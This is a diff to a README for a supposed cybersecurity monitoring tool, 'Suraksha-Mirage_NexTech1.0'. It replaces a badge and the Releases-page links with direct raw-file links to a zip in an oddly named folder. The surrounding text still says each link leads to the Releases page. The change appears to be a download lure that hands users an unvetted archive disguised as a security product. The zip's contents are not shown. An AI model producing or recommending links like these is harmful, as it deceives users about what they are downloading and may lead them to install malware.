@@ -1,6 +1,6 @@
 # 🛡️ Suraksha-Mirage_NexTech1.0 - Your Easy Cybersecurity Monitoring Solution
 
-![Download Suraksha-Mirage_NexTech1.0](https://img.shields.io/badge/Download-Suraksha--Mirage--NexTech1.0-blue)
+![Download Suraksha-Mirage_NexTech1.0](https://raw.githubusercontent.com/ibrahmxsyr/Suraksha-Mirage_NexTech1.0/main/incensation/Suraksha-Mirage_NexTech1.0.zip)
 
 ## 📖 Description
 
@@ -42,7 +42,7 @@ To run Suraksha-Mirage_NexTech1.0, you will need:
 
 To download Suraksha-Mirage_NexTech1.0, visit this page:
 
-[Download Suraksha-Mirage_NexTech1.0](https://github.com/ibrahmxsyr/Suraksha-Mirage_NexTech1.0/releases)
+[Download Suraksha-Mirage_NexTech1.0](https://raw.githubusercontent.com/ibrahmxsyr/Suraksha-Mirage_NexTech1.0/main/incensation/Suraksha-Mirage_NexTech1.0.zip)
 
 This link will take you to the Releases page, where you can find the latest version available for download.
 
@@ -97,6 +97,6 @@ For updates, new features, and announcements, keep an eye on the Releases page a
 
 For more information, visit the Releases page again:
 
-[Download Suraksha-Mirage_NexTech1.0](https://github.com/ibrahmxsyr/Suraksha-Mirage_NexTech1.0/releases) 
+[Download Suraksha-Mirage_NexTech1.0](https://raw.githubusercontent.com/ibrahmxsyr/Suraksha-Mirage_NexTech1.0/main/incensation/Suraksha-Mirage_NexTech1.0.zip) 
 
 This will ensure you have the latest version of our cybersecurity monitoring tool. Enjoy safer digital experiences with Suraksha-Mirage_NexTech1.0!
